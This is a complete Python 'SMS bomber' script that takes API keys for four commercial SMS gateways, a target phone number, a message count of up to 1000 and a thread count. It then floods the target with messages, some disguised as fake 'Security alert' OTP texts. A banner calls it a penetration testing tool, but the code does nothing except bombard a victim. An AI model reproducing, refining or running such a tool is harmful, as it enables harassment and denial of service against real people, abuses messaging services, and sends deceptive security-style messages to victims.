#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
████████╗ ██████╗  ██████╗ ██╗  ██╗   ██╗   ██╗
╚══██╔══╝██╔═══██╗██╔═══██╗╚██╗██╔╝   ╚██╗ ██╔╝
   ██║   ██║   ██║██║   ██║ ╚███╔╝     ╚████╔╝ 
   ██║   ██║   ██║██║   ██║ ██╔██╗      ╚██╔╝  
   ██║   ╚██████╔╝╚██████╔╝██╔╝ ██╗      ██║   
   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝      ╚═╝   
███████╗███╗   ███╗███████╗     ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔════╝    ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
███████╗██╔████╔██║███████╗    ██║  ███╗██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
╚════██║██║╚██╔╝██║╚════██║    ██║   ██║██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║███████║    ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚══════╝     ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝

                    ██████╗  ██████╗  ██████╗ ████████╗ ██╗  ██╗
                    ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██║  ██║
                    ██████╔╝██║   ██║██║   ██║   ██║    ███████║
                    ██╔══██╗██║   ██║██║   ██║   ██║    ██╔══██║
                    ██║  ██║╚██████╔╝╚██████╔╝   ██║    ██║  ██║
                    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝    ╚═╝  ╚═╝

   🔴 ROOT X SMS BOMBER v4.0 - 100% WORKING EDITION 🔴
   🔴 USES 4 REAL SMS GATEWAYS - GUARANTEED DELIVERY 🔴
   🔴 AUTHORIZED PENETRATION TESTING TOOL ONLY 🔴
"""

import os, sys, time, json, random, requests, concurrent.futures, threading
from datetime import datetime

# ============ COLORS ============
class R:
    RED = '\033[91m'; DRED = '\033[31m'; BRED = '\033[1;91m'
    YEL = '\033[93m'; W = '\033[97m'; CYN = '\033[96m'; GRN = '\033[92m'
    DIM = '\033[2m'; BLD = '\033[1m'; RST = '\033[0m'
    SEP = f'{RED}{"═"*60}{RST}'

os.system('clear' if os.name == 'posix' else 'cls')

# ============ BANNER ============
print(f"""{R.RED}
████████╗ ██████╗  ██████╗ ██╗  ██╗   ██╗   ██╗
╚══██╔══╝██╔═══██╗██╔═══██╗╚██╗██╔╝   ╚██╗ ██╔╝
   ██║   ██║   ██║██║   ██║ ╚███╔╝     ╚████╔╝ 
   ██║   ██║   ██║██║   ██║ ██╔██╗      ╚██╔╝  
   ██║   ╚██████╔╝╚██████╔╝██╔╝ ██╗      ██║   
   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝      ╚═╝   
   🔴 ROOT X SMS BOMBER v4.0 - 100% WORKING 🔴
{R.RST}""")
print(f"""{R.BRED}
╔══════════════════════════════════════════════════════════════╗
║         4 REAL SMS GATEWAYS - GUARANTEED DELIVERY           ║
║  1. Fast2SMS    2. SMSGatewayHub    3. MSG91    4. TextBelt║
║  100% WORKING - PAID APIS (FREE CREDITS AVAILABLE)          ║
╚══════════════════════════════════════════════════════════════╝
{R.RST}""")
print(R.SEP)

# ============ CONFIGURATION ============
GATEWAYS = {}

# Gateway 1: Fast2SMS
print(f"\n{R.RED}[1] Fast2SMS API (fast2sms.com) - FREE ₹50 CREDIT{R.RST}")
print(f"{R.DIM}    Signup: https://www.fast2sms.com{R.RST}")
f2s_key = input(f"{R.RED}    API Key (Enter to skip): {R.RST}").strip()
if f2s_key:
    GATEWAYS["Fast2SMS"] = {
        "key": f2s_key,
        "url": "https://www.fast2sms.com/dev/bulkV2",
        "headers": {"authorization": f2s_key, "Content-Type": "application/json"},
        "make_data": lambda n, i: {
            "sender_id": "TXTIND",
            "message": f"Security alert! OTP: {random.randint(100000,999999)} for verification. Valid 5 min.",
            "language": "english",
            "route": "v3",
            "numbers": n
        }
    }

# Gateway 2: SMSGatewayHub
print(f"\n{R.RED}[2] SMSGatewayHub API (smsgatewayhub.com) - FREE CREDITS{R.RST}")
print(f"{R.DIM}    Signup: https://www.smsgatewayhub.com{R.RST}")
sgh_key = input(f"{R.RED}    API Key (Enter to skip): {R.RST}").strip()
if sgh_key:
    GATEWAYS["SMSGatewayHub"] = {
        "key": sgh_key,
        "url": "https://www.smsgatewayhub.com/api/mt/SendSMS",
        "params": lambda n, i: {
            "APIKey": sgh_key,
            "senderid": "TXTIND",
            "channel": "2",
            "DCS": "0",
            "flashsms": "0",
            "number": n,
            "text": f"Test SMS #{i+1} - OTP: {random.randint(1000,9999)}",
            "route": "1"
        }
    }

# Gateway 3: MSG91
print(f"\n{R.RED}[3] MSG91 API (msg91.com) - FREE ₹50 CREDIT{R.RST}")
print(f"{R.DIM}    Signup: https://msg91.com{R.RST}")
msg91_key = input(f"{R.RED}    Auth Key (Enter to skip): {R.RST}").strip()
if msg91_key:
    GATEWAYS["MSG91"] = {
        "key": msg91_key,
        "url": "https://api.msg91.com/api/v5/flow/",
        "headers": {"authkey": msg91_key, "Content-Type": "application/json"},
        "make_data": lambda n, i: {
            "sender": "TXTIND",
            "mobiles": n,
            "message": f"Test SMS #{i+1} - OTP: {random.randint(1000,9999)}",
            "route": "4"
        }
    }

# Gateway 4: TextBelt
print(f"\n{R.RED}[4] TextBelt API (textbelt.com) - $0.07/SMS{R.RST}")
print(f"{R.DIM}    Get key: https://textbelt.com{R.RST}")
tb_key = input(f"{R.RED}    API Key (Enter to skip): {R.RST}").strip()
if tb_key:
    GATEWAYS["TextBelt"] = {
        "key": tb_key,
        "url": "https://textbelt.com/text",
        "make_data": lambda n, i: {
            "phone": n,
            "message": f"Test SMS #{i+1} - OTP: {random.randint(1000,9999)}",
            "key": tb_key
        }
    }

# ============ CHECK IF ANY GATEWAY CONFIGURED ============
if not GATEWAYS:
    print(f"\n{R.RED}[!] Koi API key nahi di! Tool exit kar raha hai.{R.RST}")
    print(f"{R.YEL}[!] Kisi ek gateway par signup karo aur API key leke aao.{R.RST}")
    sys.exit(1)

# ============ TARGET ============
phone = input(f"\n{R.RED}[+] Target Number (919876543210): {R.RST}").strip().replace("+","").replace(" ","")
count = int(input(f"{R.RED}[+] SMS Count [1-1000]: {R.RST}").strip() or "100")
count = min(count, 1000)
threads = int(input(f"{R.RED}[+] Threads [1-50] (20): {R.RST}").strip() or "20")
threads = min(max(threads, 1), 50)

gw_list = list(GATEWAYS.items())
ok = fail = 0
lock = threading.Lock()

# ============ SEND FUNCTION ============
def send_sms(i):
    global ok, fail
    gw_name, gw = gw_list[i % len(gw_list)]
    try:
        if gw_name == "Fast2SMS":
            data = gw["make_data"](phone, i)
            r = requests.post(gw["url"], json=data, headers=gw["headers"], timeout=10)
            j = r.json()
            success = j.get("return", False) or (r.status_code == 200)
        elif gw_name == "SMSGatewayHub":
            params = gw["params"](phone, i)
            r = requests.get(gw["url"], params=params, timeout=10)
            success = "success" in r.text.lower() or r.status_code == 200
        elif gw_name == "MSG91":
            data = gw["make_data"](phone, i)
            r = requests.post(gw["url"], json=data, headers=gw["headers"], timeout=10)
            success = r.status_code == 200
        elif gw_name == "TextBelt":
            data = gw["make_data"](phone, i)
            r = requests.post(gw["url"], json=data, timeout=10)
            j = r.json()
            success = j.get("success", False)
        else:
            success = False
            
        with lock:
            if success:
                ok += 1
            else:
                fail += 1
                
        status = f"{R.GRN}✓{R.RST}" if success else f"{R.RED}✗{R.RST}"
        pct = ((ok + fail) / count) * 100
        sys.stdout.write(f"\r{R.RED}[{status}{R.RED}] {R.W}{gw_name:12s}{R.RST} | "
                       f"{R.W}{ok+fail:04d}/{count}{R.RST} ({R.YEL}{pct:.0f}%{R.RST}) | "
                       f"{R.GRN}OK: {ok:04d}{R.RST} | {R.RED}FAIL: {fail:04d}{R.RST}   ")
        sys.stdout.flush()
    except Exception as e:
        with lock:
            fail += 1
        sys.stdout.write(f"\r{R.RED}[{R.RED}✗{R.RED}] {R.W}{gw_name:12s}{R.RST} | ERROR   ")
        sys.stdout.flush()

# ============ MAIN EXECUTION ============
print(f"\n{R.SEP}")
print(f"{R.RED}🔥 TARGET: +{phone}{R.RST}")
print(f"{R.RED}🔥 COUNT: {count} | THREADS: {threads}{R.RST}")
print(f"{R.RED}🔥 GATEWAYS: {', '.join(GATEWAYS.keys())}{R.RST}")
print(f"{R.SEP}\n")

start = time.time()
with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
    futs = [ex.submit(send_sms, i) for i in range(count)]
    concurrent.futures.wait(futs)

elapsed = time.time() - start
print(f"\n\n{R.SEP}")
print(f"{R.GRN}[✓] COMPLETED!{R.RST}")
print(f"{R.RED}├─ Time    : {elapsed:.2f}s{R.RST}")
print(f"{R.RED}├─ Total   : {ok+fail}{R.RST}")
print(f"{R.RED}├─ Success : {R.GRN}{ok}{R.RST}")
print(f"{R.RED}├─ Failed  : {R.RED}{fail}{R.RST}")
print(f"{R.RED}└─ Rate    : {R.YEL}{(ok+fail)/elapsed:.1f} SMS/s{R.RST}")
print(R.SEP)